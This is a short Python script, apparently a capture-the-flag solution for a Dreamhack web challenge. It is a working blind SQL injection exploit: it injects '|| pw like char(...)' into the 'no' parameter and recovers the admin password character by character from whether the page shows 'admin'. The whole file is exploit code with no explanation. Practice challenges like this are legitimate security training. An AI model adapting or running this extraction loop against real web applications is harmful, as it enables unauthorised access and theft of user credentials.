import requests

server = 'http://host1.dreamhack.games:22266/'
chars = '0123456789abcdef'
pw = ''

for idx in range(32):
    for char in chars:
        url = server
        url += '?no=4 || pw like char('
        for c in pw:
            url += str(ord(c)) + ','
        url += str(ord(char)) + ','
        url += str(ord('%'))
        url += ')'

        res = requests.get(url)
        if 'admin' in res.text:
            pw += char
            print(pw)
            break

print('admin\'s pw: ' + pw)